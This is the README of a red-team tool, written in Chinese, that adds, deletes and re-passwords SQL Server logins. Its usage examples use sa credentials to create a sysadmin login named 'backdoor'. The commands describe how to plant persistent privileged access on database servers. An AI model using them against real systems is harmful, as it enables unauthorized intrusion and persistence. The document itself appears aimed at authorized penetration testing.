# Sharp MSSQL User Manager

红队专用的SQL Server用户管理工具，支持快速添加sysadmin权限用户、删除用户和修改密码。

## 🚀 功能特性

- ✅ **添加用户并自动加入sysadmin角色**
- ✅ **删除SQL Server登录用户**  
- ✅ **修改用户密码**
- ✅ **支持集成身份验证和SQL身份验证**
- ✅ **自动权限验证**
- ✅ **清理数据库用户映射**

## 📋 使用方法

### 基本命令格式

#### 1. 添加用户（自动加入sysadmin）
```bash
# 使用SQL身份验证
Sharpmssqluser.exe add -s 192.168.1.100 -u sa -p password123 -tu backdoor -tp P@ssw0rd123

# 使用集成身份验证
Sharpmssqluser.exe add -s 192.168.1.100 -i -tu backdoor -tp P@ssw0rd123
```

#### 2. 删除用户
```bash
# 删除指定用户
Sharpmssqluser.exe delete -s 192.168.1.100 -u sa -p password123 -tu backdoor
```

#### 3. 修改用户密码
```bash
# 修改用户密码
Sharpmssqluser.exe changepass -s 192.168.1.100 -u sa -p password123 -tu backdoor -np NewP@ssw0rd456
```

## 📖 参数说明

### 全局参数
- `-s, --server`: SQL Server地址 (必需)
- `-u, --username`: 连接用户名
- `-p, --password`: 连接密码  
- `-i, --integrated`: 使用windows身份验证
- `-d, --database`: 目标数据库 (默认: master)

### 命令特定参数
- `-tu, --target-user`: 目标用户名 (必需)
- `-tp, --target-password`: 目标用户密码 (添加用户时必需)
- `-np, --new-password`: 新密码 (修改密码时必需)

---

**免责声明**: 此工具仅用于授权的安全测试目的，请勿用于非法活动。 